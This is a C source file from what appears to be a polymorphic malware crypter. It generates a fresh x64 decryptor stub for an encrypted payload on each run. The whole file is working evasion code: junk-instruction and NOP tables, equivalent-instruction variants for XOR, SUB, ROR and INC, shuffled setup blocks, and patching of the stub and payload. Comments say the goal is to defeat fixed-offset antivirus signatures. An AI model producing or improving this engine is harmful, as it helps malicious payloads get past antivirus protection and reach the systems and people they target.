/*
 * ==========================================================================
 *  MutationEngine.c – Polymorphic mutation engine – implementation
 * ==========================================================================
 *
 *  This file implements the heart of the polymorphic engine.
 *  It operates on raw x64 BYTES, modifying the decryptor template
 *  (DecryptorStub.asm) so that each run produces different machine code.
 *
 *  TEMPLATE ARCHITECTURE (DecryptorStub.asm):
 *  ------------------------------------------
 *  The template consists of the following parts (offsets in bytes):
 *
 *  [0..4]   – mov edx, imm32            (5B) – Block B: payload length
 *  [5..7]   – xor r9d, r9d              (3B) – Block C: zeroing index
 *  [8..11]  – mov al, [rcx+r9]          (4B) – loading byte
 *  [12..13] – xor al, KEY4              (2B) – decryptor step 4'
 *  [14..15] – sub al, KEY3              (2B) – decryptor step 3'
 *  [16..18] – ror al, ROT_BITS          (3B) – decryptor step 2'
 *  [19..20] – xor al, KEY1              (2B) – decryptor step 1'
 *  [21..24] – mov [rcx+r9], al          (4B) – storing byte
 *  [25..27] – inc r9                    (3B) – incrementing
 *  [28..30] – cmp rdx, r9              (3B) – comparing
 *  [31..32] – jne loop                  (2B) – loop jump
 *  [33]     – ret                       (1B) – return to Stub.cpp
 *
 *  Total template size: 34 bytes
 *
 *  RCX = payload pointer passed by Stub.cpp caller (Windows x64 ABI first arg).
 *  Block A (lea rcx, [rip+disp32]) removed — decryptor and payload live in
 *  separate allocations, eliminating the RWX requirement entirely.
 *
 *  PLACEHOLDERS (0xCC bytes):
 *    Offset 1  in mov edx – PAYLOAD_LEN (4 bytes: 0xCCCCCCCC)
 *    Offset 12 in xor al  – KEY4 (1 byte: 0xCC)
 *    Offset 14 in sub al  – KEY3 (1 byte: 0xCC)
 *    Offset 17 in ror al  – ROT_BITS (1 byte: 0xCC)
 *    Offset 19 in xor al  – KEY1 (1 byte: 0xCC)
 * ==========================================================================
 */

#include "MutationEngine.h"
#include <intrin.h>
#include <stdlib.h>
#include <string.h>

/* ============================================================
 *  DECRYPTOR TEMPLATE – imported from DecryptorStub.asm
 * ============================================================ */
extern BYTE DecryptorStubBegin[];
extern BYTE DecryptorStubEnd[];

/* ============================================================
 *  STABLE OFFSETS in the template (used when copying blocks)
 * ============================================================ */
#define TMPL_BLOCK_B_OFF 0 /* mov edx – 5 bytes */
#define TMPL_BLOCK_B_SIZE 5
#define TMPL_BLOCK_B_IMM 1 /* offset imm32 inside block B */

#define TMPL_BLOCK_C_OFF 5 /* xor r9d – 3 bytes */
#define TMPL_BLOCK_C_SIZE 3

/* ============================================================
 *  SETUP BLOCKS – independent instruction blocks in the setup part
 *
 *  Blocks B (mov edx) and C (xor r9d) are INDEPENDENT –
 *  they don't refer to each other's results. Therefore we can
 *  freely permute them to change signatures.
 *  (Block A removed – RCX is now passed by the caller.)
 * ============================================================ */
typedef struct _SETUP_BLOCK {
  BYTE bytes[8]; /* instruction bytes (max 7 B + padding)  */
  int len;       /* actual length in bytes                 */
} SETUP_BLOCK;

/* ============================================================
 *  MULTI-BYTE NOP – various NOP instruction variants
 *
 *  The x64 processor recognizes many different NOP forms:
 *  - 1-byte: 0x90 (classic NOP)
 *  - 2-byte: 0x66 0x90 (NOP with operand-size prefix)
 *  - 3-byte: 0x0F 0x1F 0x00 (official multi-byte NOP)
 *  - up to 9 bytes
 *
 *  We use various variants so that even NOPs look different
 *  in subsequent mutations.
 * ============================================================ */
static const BYTE NOP_1[] = {0x90};
static const BYTE NOP_2[] = {0x66, 0x90};
static const BYTE NOP_3[] = {0x0F, 0x1F, 0x00};
static const BYTE NOP_4[] = {0x0F, 0x1F, 0x40, 0x00};
static const BYTE NOP_5[] = {0x0F, 0x1F, 0x44, 0x00, 0x00};

static const BYTE *NOP_TABLE[] = {NOP_1, NOP_2, NOP_3, NOP_4, NOP_5};
static const int NOP_SIZES[] = {1, 2, 3, 4, 5};
#define NOP_VARIANT_COUNT 5

/* ============================================================
 *  JUNK CODE – "dead" instructions (not affecting state)
 *
 *  Junk code are instructions that the processor executes,
 *  but they don't change any registers/flags we use.
 *  Example: push rax + pop rax – saves and immediately
 *  restores the same register – net effect: zero.
 *
 *  We insert them randomly to "dilute" real instruction
 *  signatures and change code size.
 * ============================================================ */
typedef struct _JUNK_INSTR {
  const BYTE *bytes;
  int len;
} JUNK_INSTR;

/*
 * NOTE: We do NOT use push rax / pop rax as junk code!
 * AL is part of RAX and stores a byte during decryption.
 * All entries below operate on registers that are NOT live
 * (not used) in the decryptor: RBX, R10, R11, R12, R13.
 * test/xchg/mov reg,reg are pure no-ops (same value written back).
 * push/pop pairs restore the register – safe even for callee-saved R12/R13.
 */

/* ---- RBX (caller-saved) ---- */
static const BYTE JUNK_PUSH_POP_RBX[] = {0x53, 0x5B};            /* push rbx; pop rbx   */
static const BYTE JUNK_XCHG_RBX[]     = {0x48, 0x87, 0xDB};      /* xchg rbx, rbx       */
static const BYTE JUNK_LEA_RBX[]      = {0x48, 0x8D, 0x1B};      /* lea rbx, [rbx]      */
static const BYTE JUNK_NOP[]          = {0x90};                   /* nop                 */
static const BYTE JUNK_MOV_RBX_RBX[]  = {0x48, 0x89, 0xDB};      /* mov rbx, rbx        */
static const BYTE JUNK_TEST_RBX[]     = {0x48, 0x85, 0xDB};       /* test rbx, rbx       */

/* ---- R10 (caller-saved) ---- */
static const BYTE JUNK_PUSH_POP_R10[] = {0x41, 0x52, 0x41, 0x5A}; /* push r10; pop r10   */
static const BYTE JUNK_XCHG_R10[]     = {0x4D, 0x87, 0xD2};       /* xchg r10, r10       */
static const BYTE JUNK_TEST_R10[]     = {0x4D, 0x85, 0xD2};       /* test r10, r10       */
static const BYTE JUNK_MOV_R10_R10[]  = {0x4D, 0x89, 0xD2};       /* mov r10, r10        */

/* ---- R11 (caller-saved) ---- */
static const BYTE JUNK_PUSH_POP_R11[] = {0x41, 0x53, 0x41, 0x5B}; /* push r11; pop r11   */
static const BYTE JUNK_XCHG_R11[]     = {0x4D, 0x87, 0xDB};       /* xchg r11, r11       */
static const BYTE JUNK_TEST_R11[]     = {0x4D, 0x85, 0xDB};       /* test r11, r11       */
static const BYTE JUNK_MOV_R11_R11[]  = {0x4D, 0x89, 0xDB};       /* mov r11, r11        */

/* ---- R12 (callee-saved — push/pop pair preserves it) ---- */
static const BYTE JUNK_PUSH_POP_R12[] = {0x41, 0x54, 0x41, 0x5C}; /* push r12; pop r12   */
static const BYTE JUNK_XCHG_R12[]     = {0x4D, 0x87, 0xE4};       /* xchg r12, r12       */
static const BYTE JUNK_TEST_R12[]     = {0x4D, 0x85, 0xE4};       /* test r12, r12       */
static const BYTE JUNK_MOV_R12_R12[]  = {0x4D, 0x89, 0xE4};       /* mov r12, r12        */

/* ---- R13 (callee-saved — push/pop pair preserves it) ---- */
static const BYTE JUNK_PUSH_POP_R13[] = {0x41, 0x55, 0x41, 0x5D}; /* push r13; pop r13   */
static const BYTE JUNK_XCHG_R13[]     = {0x4D, 0x87, 0xED};       /* xchg r13, r13       */
static const BYTE JUNK_TEST_R13[]     = {0x4D, 0x85, 0xED};       /* test r13, r13       */
static const BYTE JUNK_MOV_R13_R13[]  = {0x4D, 0x89, 0xED};       /* mov r13, r13        */

static const JUNK_INSTR JUNK_TABLE[] = {
    /* RBX */
    {JUNK_PUSH_POP_RBX,  2}, {JUNK_XCHG_RBX,     3}, {JUNK_LEA_RBX,      3},
    {JUNK_NOP,           1}, {JUNK_MOV_RBX_RBX,  3}, {JUNK_TEST_RBX,     3},
    /* R10 */
    {JUNK_PUSH_POP_R10,  4}, {JUNK_XCHG_R10,     3}, {JUNK_TEST_R10,     3},
    {JUNK_MOV_R10_R10,   3},
    /* R11 */
    {JUNK_PUSH_POP_R11,  4}, {JUNK_XCHG_R11,     3}, {JUNK_TEST_R11,     3},
    {JUNK_MOV_R11_R11,   3},
    /* R12 */
    {JUNK_PUSH_POP_R12,  4}, {JUNK_XCHG_R12,     3}, {JUNK_TEST_R12,     3},
    {JUNK_MOV_R12_R12,   3},
    /* R13 */
    {JUNK_PUSH_POP_R13,  4}, {JUNK_XCHG_R13,     3}, {JUNK_TEST_R13,     3},
    {JUNK_MOV_R13_R13,   3},
};
#define JUNK_COUNT 22

/* ============================================================
 *  INSTRUCTION EQUIVALENCE – equivalent instructions
 *
 *  Instead of "xor al, imm8" we can use another instruction
 *  sequence that gives the SAME result. Example:
 *
 *    xor al, K  <==>  not al ; and al, ~K ; ... (different variants)
 *    sub al, K  <==>  add al, (256-K)  (because arithmetic mod 256)
 *    ror al, N  <==>  shl al, (8-N) ; shr + or (emulate rotation)
 *
 *  These equivalences are used RANDOMLY – each run can use
 *  a different variant, changing signatures.
 * ============================================================ */

/* ---------- XOR al, imm8 variant ---------- */

/*
 * EmitXorAlImm8_Variant1: standard "xor al, imm8"
 * Machine code: 34 <imm8>
 */
static int EmitXorAlImm8_V1(BYTE *out, BYTE imm8) {
  out[0] = 0x34;
  out[1] = imm8;
  return 2;
}

/*
 * EmitXorAlImm8_Variant2: emulation via push/mov/xor/pop
 *
 * Uses preserved register rbx to store the key:
 *   push rbx
 *   mov bl, imm8
 *   xor al, bl
 *   pop rbx
 * Gives the same result, but changes the opcode (xor al, reg instead of xor al, imm8).
 */
static int EmitXorAlImm8_V2(BYTE *out, BYTE imm8) {
  /* push rbx */
  out[0] = 0x53;
  /* mov bl, imm8 */
  out[1] = 0xB3;
  out[2] = imm8;
  /* xor al, bl */
  out[3] = 0x30;
  out[4] = 0xD8;
  /* pop rbx */
  out[5] = 0x5B;
  return 6;
}

/*
 * EmitXorAlImm8_Variant3: logiczna dekompozycja bez rejestru pomocniczego
 *
 *   not al          ; al = al XOR 0xFF
 *   xor al, ~imm8   ; al = (al XOR 0xFF) XOR ~imm8
 *                   ;    = al XOR (0xFF XOR ~imm8)
 *                   ;    = al XOR imm8   ✓
 *
 * Strukturalnie odmienne od V2 – używa opcode NOT (F6 D0), brak push/pop/rejestru.
 */
static int EmitXorAlImm8_V3(BYTE *out, BYTE imm8) {
  out[0] = 0xF6; out[1] = 0xD0;          /* not al        */
  out[2] = 0x34; out[3] = (BYTE)(~imm8); /* xor al, ~imm8 */
  return 4;
}

/* ---------- SUB al, imm8 variant ---------- */

/*
 * EmitSubAlImm8_V1: standard "sub al, imm8"
 * Machine code: 2C <imm8>
 */
static int EmitSubAlImm8_V1(BYTE *out, BYTE imm8) {
  out[0] = 0x2C;
  out[1] = imm8;
  return 2;
}

/*
 * EmitSubAlImm8_V2: "add al, (256 - imm8)"
 * Works because: sub al, K == add al, (-K mod 256) == add al, (256-K)
 * Arithmetic mod 256 ensures both give the identical result.
 */
static int EmitSubAlImm8_V2(BYTE *out, BYTE imm8) {
  out[0] = 0x04;             /* add al, imm8 */
  out[1] = (BYTE)(0 - imm8); /* 256 - imm8 (mod 256) = complement */
  return 2;
}

/*
 * EmitSubAlImm8_V3: tożsamość algebraiczna neg+add+neg
 *
 *   neg al         ; al = (-a)       mod 256
 *   add al, imm8   ; al = (-a + k)   mod 256
 *   neg al         ; al = (a - k)    mod 256  ✓
 *
 * Strukturalnie odmienne od V2 – używa opcode NEG (F6 D8), brak push/pop/rejestru.
 */
static int EmitSubAlImm8_V3(BYTE *out, BYTE imm8) {
  out[0] = 0xF6; out[1] = 0xD8; /* neg al     */
  out[2] = 0x04; out[3] = imm8; /* add al, k  */
  out[4] = 0xF6; out[5] = 0xD8; /* neg al     */
  return 6;
}

/* ---------- ROR al, imm8 variant ---------- */

/*
 * EmitRorAlImm8_V1: standard "ror al, imm8"
 * Machine code: C0 C8 <imm8>
 */
static int EmitRorAlImm8_V1(BYTE *out, BYTE imm8) {
  out[0] = 0xC0;
  out[1] = 0xC8;
  out[2] = imm8;
  return 3;
}

/*
 * EmitRorAlImm8_V2: emulation of ROR using ROL with complementary shift
 * ror al, N  <==>  rol al, (8 - N)
 * Machine code: C0 C0 <8-imm8>
 */
static int EmitRorAlImm8_V2(BYTE *out, BYTE imm8) {
  out[0] = 0xC0;
  out[1] = 0xC0;                   /* rol al, imm8 */
  out[2] = (BYTE)(8 - (imm8 & 7)); /* complementary shift */
  return 3;
}

/*
 * EmitRorAlImm8_V3: emulation via helper rcx/r11 and ror r/m, cl
 *
 * The `ror r/m, cl` instruction takes the CL register as the shift amount.
 *   mov r11b, imm8
 *   push rcx         (save rcx from the original address)
 *   mov cl, r11b
 *   ror al, cl
 *   pop rcx          (restore address in rcx)
 */
static int EmitRorAlImm8_V3(BYTE *out, BYTE imm8) {
  /* Note: rcx is used as a pointer! We'll use r11 */
  /* mov r11b, imm8 */
  out[0] = 0x41;
  out[1] = 0xB3;
  out[2] = imm8;
  /* push rcx; save */
  out[3] = 0x51;
  /* mov cl, r11b */
  out[4] = 0x44;
  out[5] = 0x88;
  out[6] = 0xD9;
  /* ror al, cl */
  out[7] = 0xD2;
  out[8] = 0xC8;
  /* pop rcx; restore */
  out[9] = 0x59;
  return 10;
}

/* ============================================================
 *  EmitIncR9 – variants for "inc r9" (index increment)
 *
 *  All three increment R9 by exactly 1:
 *    V1: inc r9          (49 FF C1)       – classic, 3B
 *    V2: add r9, 1       (49 83 C1 01)    – ADD immediate, 4B
 *    V3: lea r9, [r9+1]  (4D 8D 49 01)   – LEA displacement, 4B
 * ============================================================ */
static int EmitIncR9(BYTE *out) {
  switch (rand() % 3) {
  case 0: /* inc r9 */
    out[0] = 0x49; out[1] = 0xFF; out[2] = 0xC1;
    return 3;
  case 1: /* add r9, 1 */
    out[0] = 0x49; out[1] = 0x83; out[2] = 0xC1; out[3] = 0x01;
    return 4;
  default: /* lea r9, [r9+1] — REX.R=1 REX.B=1 → REX=4D; ModRM mod=01 reg=001 r/m=001 → 0x49 */
    out[0] = 0x4D; out[1] = 0x8D; out[2] = 0x49; out[3] = 0x01;
    return 4;
  }
}

/* ============================================================
 *  EmitCmpRdxR9 – variants for "cmp rdx, r9" (loop condition)
 *
 *  Both test rdx == r9; ZF is identical so jne works the same:
 *    V1: cmp rdx, r9  (4C 39 CA)  – CMP r/m64, r64
 *    V2: cmp r9, rdx  (4C 3B CA)  – CMP r64, r/m64  (operands swapped)
 * ============================================================ */
static int EmitCmpRdxR9(BYTE *out) {
  switch (rand() % 2) {
  case 0: /* cmp rdx, r9 */
    out[0] = 0x4C; out[1] = 0x39; out[2] = 0xCA;
    return 3;
  default: /* cmp r9, rdx */
    out[0] = 0x4C; out[1] = 0x3B; out[2] = 0xCA;
    return 3;
  }
}

/* ============================================================
 *  Helper: EmitBytes – copies bytes to the output buffer
 *  and returns the new position (offset) after the copied bytes.
 * ============================================================ */
static int EmitBytes(BYTE *out, int offset, const BYTE *src, int len) {
  memcpy(out + offset, src, len);
  return offset + len;
}

/* ============================================================
 *  Helper: InsertRandomJunk – inserts 0-2 random junk instructions
 *  at the current position in the output buffer.
 *
 *  Returns the new offset (after the inserted instructions).
 * ============================================================ */
static int InsertRandomJunk(BYTE *out, int offset) {
  /* Random number of junk instructions: 0, 1 or 2 */
  int count = rand() % 3;
  for (int i = 0; i < count; i++) {
    int idx = rand() % JUNK_COUNT;
    memcpy(out + offset, JUNK_TABLE[idx].bytes, JUNK_TABLE[idx].len);
    offset += JUNK_TABLE[idx].len;
  }
  return offset;
}

/* ============================================================
 *  Helper: InsertRandomNop – inserts a random multi-byte NOP
 *  or does not insert anything (50% chance for NOP).
 *
 *  Returns the new offset.
 * ============================================================ */
static int InsertRandomNop(BYTE *out, int offset) {
  if (rand() % 2 == 0) {
    int idx = rand() % NOP_VARIANT_COUNT;
    memcpy(out + offset, NOP_TABLE[idx], NOP_SIZES[idx]);
    offset += NOP_SIZES[idx];
  }
  return offset;
}

/* ============================================================
 *  MutateDecryptor() – main mutation function
 *
 *  Algorithm:
 *  ---------
 *  1. Copy 3 setup blocks (A, B, C) from the template
 *  2. Randomly PERMUTE them (A,B,C -> B,C,A -> ...)
 *  3. Insert junk code between blocks
 *  4. Emit decryption loop instructions, randomly choosing
 *     equivalent variants for each cipher instruction
 *  5. Insert NOPs and junk code between instructions
 *  6. Calculate and patch: payload offset (lea rcx), length (mov edx),
 *     keys (KEY1-KEY4, ROT_BITS), loop jump (jne)
 *  7. Append encrypted payload at the end
 * ============================================================ */
BOOL MutateDecryptor(const BYTE *pEncPayload, SIZE_T payloadLen,
                     const COMPOUND_KEY *pKey, PMUTATED_SHELLCODE pOut) {
  /*
   * Working buffer – allocate much more than needed,
   * because mutation can increase the stub size (junk code, NOPs,
   * longer instruction equivalents). 4x should be enough.
   */
  SIZE_T originalStubSize = (SIZE_T)(DecryptorStubEnd - DecryptorStubBegin);

  /* Verify the template bytes we are about to copy/patch match the expected
   * opcodes.  If MASM changes instruction encoding (e.g. after a toolchain
   * update), this catches the mismatch at build time instead of silently
   * producing a broken decryptor stub.
   *
   * Block B @ TMPL_BLOCK_B_OFF=0: mov edx, imm32  → first byte must be 0xBA
   * Block C @ TMPL_BLOCK_C_OFF=5: xor r9d, r9d   → first byte must be 0x45 (REX.B) */
  if (originalStubSize < 8 ||
      DecryptorStubBegin[TMPL_BLOCK_B_OFF] != 0xBA ||
      DecryptorStubBegin[TMPL_BLOCK_C_OFF] != 0x45) {
      HeapFree(GetProcessHeap(), 0, NULL); /* no-op, just symmetrical with alloc path */
      return FALSE; /* Template mismatch — update TMPL_BLOCK_*_OFF constants */
  }

  SIZE_T maxStubSize = originalStubSize * 4 + 256;
  SIZE_T bufSize = maxStubSize + payloadLen;
  BYTE *buf = (BYTE *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, bufSize);
  if (!buf)
    return FALSE;

  /* Seed RNG for this run */
  srand((unsigned int)(__rdtsc() & 0xFFFFFFFF));

  int pos = 0; /* current write position in output buffer */

  /* ===========================================================
   *  STEP 1 & 2: Extract setup blocks and randomly PERMUTE them
   *
   *  Block B (5B): mov edx, imm32   – payload length
   *  Block C (3B): xor r9d, r9d    – zero loop index
   *  Block D (3B): xor r10d, r10d  – independent, no-op for decryptor
   *  Block E (3B): xor r11d, r11d  – independent, no-op for decryptor
   *
   *  Blocks D and E use registers not live in the decryptor (R10, R11).
   *  They exist purely to increase preamble length variance and shuffle
   *  entropy: 4! = 24 possible orderings vs. the previous 2.
   *  Combined with inter-block junk, the offset of loopStartOffset
   *  varies widely across builds — breaks fixed-offset AV signatures.
   *
   *  RCX (payload pointer) is passed by the caller — Block A removed.
   * =========================================================== */
  SETUP_BLOCK blocks[4];

  /* Block B: mov edx, imm32 – 5 bytes (from template) */
  memcpy(blocks[0].bytes, DecryptorStubBegin + TMPL_BLOCK_B_OFF,
         TMPL_BLOCK_B_SIZE);
  blocks[0].len = TMPL_BLOCK_B_SIZE;

  /* Block C: xor r9d, r9d – 3 bytes (from template) */
  memcpy(blocks[1].bytes, DecryptorStubBegin + TMPL_BLOCK_C_OFF,
         TMPL_BLOCK_C_SIZE);
  blocks[1].len = TMPL_BLOCK_C_SIZE;

  /* Block D: xor r10d, r10d – 45 31 D2 (REX=0x45, XOR r/m32,r32, ModRM=0xD2) */
  blocks[2].bytes[0] = 0x45; blocks[2].bytes[1] = 0x31; blocks[2].bytes[2] = 0xD2;
  blocks[2].len = 3;

  /* Block E: xor r11d, r11d – 45 31 DB (same REX, ModRM=0xDB for r11d) */
  blocks[3].bytes[0] = 0x45; blocks[3].bytes[1] = 0x31; blocks[3].bytes[2] = 0xDB;
  blocks[3].len = 3;

  /* Fisher-Yates shuffle for 4 elements → 4! = 24 orderings */
  int order[4] = {0, 1, 2, 3};
  for (int i = 3; i > 0; i--) {
    int j = rand() % (i + 1);
    int tmp = order[i];
    order[i] = order[j];
    order[j] = tmp;
  }

  /*
   * Track offset of Block B so we can patch imm32 (payload length) later.
   * Block A (disp32) no longer exists.
   */
  int blockB_imm_offset = -1;  /* offset imm32 in mov edx */

  /* Emit blocks in random order with junk in between */
  for (int i = 0; i < 4; i++) {
    int idx = order[i];

    /* Insert junk before the block (except the first one) */
    if (i > 0) {
      pos = InsertRandomJunk(buf, pos);
      pos = InsertRandomNop(buf, pos);
    }

    /* Remember the offset of imm32 inside Block B */
    if (idx == 0) {
      blockB_imm_offset = pos + 1; /* imm32 starts 1B from the beginning of mov */
    }

    /* Emit block */
    memcpy(buf + pos, blocks[idx].bytes, blocks[idx].len);
    pos += blocks[idx].len;
  }

  /* ===========================================================
   *  STEP 3: Junk code before the loop
   * =========================================================== */
  pos = InsertRandomJunk(buf, pos);

  /* ===========================================================
   *  STEP 4: Emit decryption loop with random equivalents
   *
   *  Remember the offset of the beginning of the loop, because the JNE
   *  instruction at the end must jump exactly here.
   * =========================================================== */
  int loopStartOffset = pos;

  /* --- mov al, [rcx + r9] (loading the encrypted byte) --- */
  /* This instruction has no simple equivalent, we copy it directly */
  buf[pos++] = 0x42;
  buf[pos++] = 0x8A;
  buf[pos++] = 0x04;
  buf[pos++] = 0x09;

  pos = InsertRandomNop(buf, pos);

  /*
   * Determine decryption XOR order based on pKey->xorSwapped:
   *
   *   xorSwapped=FALSE  encrypt: XOR k1 → ROL → ADD k3 → XOR k4
   *                     decrypt: XOR k4 → SUB k3 → ROR → XOR k1  (default)
   *
   *   xorSwapped=TRUE   encrypt: XOR k4 → ROL → ADD k3 → XOR k1
   *                     decrypt: XOR k1 → SUB k3 → ROR → XOR k4  (swapped)
   *
   * firstXorKey undoes the last XOR applied during encryption.
   * lastXorKey  undoes the first XOR applied during encryption.
   */
  BYTE firstXorKey = pKey->xorSwapped ? pKey->key1 : pKey->key4;
  BYTE lastXorKey  = pKey->xorSwapped ? pKey->key4 : pKey->key1;

  /* --- First XOR step (undoes last encrypt XOR) --- */
  {
    int variant = rand() % 3;
    int emitted = 0;
    switch (variant) {
    case 0:  emitted = EmitXorAlImm8_V1(buf + pos, firstXorKey); break;
    case 1:  emitted = EmitXorAlImm8_V2(buf + pos, firstXorKey); break;
    default: emitted = EmitXorAlImm8_V3(buf + pos, firstXorKey); break;
    }
    pos += emitted;
  }

  pos = InsertRandomNop(buf, pos);

  /* --- Step 3': sub al, KEY3 (undo ADD) --- */
  {
    int variant = rand() % 3;
    int emitted = 0;
    switch (variant) {
    case 0:  emitted = EmitSubAlImm8_V1(buf + pos, pKey->key3); break;
    case 1:  emitted = EmitSubAlImm8_V2(buf + pos, pKey->key3); break;
    default: emitted = EmitSubAlImm8_V3(buf + pos, pKey->key3); break;
    }
    pos += emitted;
  }

  pos = InsertRandomNop(buf, pos);

  /* --- Step 2': ror al, ROT_BITS (undo ROL) --- */
  {
    int variant = rand() % 3;
    int emitted = 0;
    switch (variant) {
    case 0:  emitted = EmitRorAlImm8_V1(buf + pos, pKey->rotBits); break;
    case 1:  emitted = EmitRorAlImm8_V2(buf + pos, pKey->rotBits); break;
    default: emitted = EmitRorAlImm8_V3(buf + pos, pKey->rotBits); break;
    }
    pos += emitted;
  }

  pos = InsertRandomNop(buf, pos);

  /* --- Last XOR step (undoes first encrypt XOR) --- */
  {
    int variant = rand() % 3;
    int emitted = 0;
    switch (variant) {
    case 0:  emitted = EmitXorAlImm8_V1(buf + pos, lastXorKey); break;
    case 1:  emitted = EmitXorAlImm8_V2(buf + pos, lastXorKey); break;
    default: emitted = EmitXorAlImm8_V3(buf + pos, lastXorKey); break;
    }
    pos += emitted;
  }

  pos = InsertRandomNop(buf, pos);

  /* --- mov [rcx + r9], al (writing the decrypted byte) --- */
  buf[pos++] = 0x42;
  buf[pos++] = 0x88;
  buf[pos++] = 0x04;
  buf[pos++] = 0x09;

  /* --- inc r9 (variant) --- */
  pos += EmitIncR9(buf + pos);

  /* --- cmp rdx, r9 (variant) --- */
  pos += EmitCmpRdxR9(buf + pos);

  /* --- jne decrypt_loop --- */
  /*
   * JNE (0x75 rel8) – jump backwards to loopStartOffset.
   * rel8 = target - (current + 2)  [+2 because the instruction itself has 2 bytes]
   * The result will be negative (backward jump) and must fit in a signed byte
   * (-128..+127).
   */
  int jnePos = pos;
  int rel8 = loopStartOffset - (jnePos + 2);

  /* Check if the jump fits in a signed byte */
  if (rel8 < -128 || rel8 > 127) {
    /* Loop too long for short jump – should not happen,
       but just in case – fallback to near jump */
    buf[pos++] = 0x0F;
    buf[pos++] = 0x85; /* jne rel32 */
    int rel32 = loopStartOffset - (pos + 4);
    memcpy(buf + pos, &rel32, 4);
    pos += 4;
  } else {
    buf[pos++] = 0x75;
    buf[pos++] = (BYTE)(rel8 & 0xFF);
  }

  /* --- ret (return immediately to Stub.exe after decryption) --- */
  buf[pos++] = 0xC3;

  /* ===========================================================
   *  STEP 5: Patching offsets and keys
   * =========================================================== */

  /* Size of the mutated stub (before adding the payload) */
  int mutatedStubSize = pos;

  /* Patch Block B: imm32 in "mov edx, imm32" = payload length */
  if (blockB_imm_offset >= 0) {
    DWORD payloadLen32 = (DWORD)payloadLen;
    memcpy(buf + blockB_imm_offset, &payloadLen32, 4);
  }

  /* ===========================================================
   *  STEP 6: Append encrypted payload after the stub
   * =========================================================== */
  memcpy(buf + mutatedStubSize, pEncPayload, payloadLen);

  /* ===========================================================
   *  STEP 7: Fill the output structure
   * =========================================================== */
  pOut->pBuffer = buf;
  pOut->stubSize = (SIZE_T)mutatedStubSize;
  pOut->totalSize = (SIZE_T)mutatedStubSize + payloadLen;

  return TRUE;
}
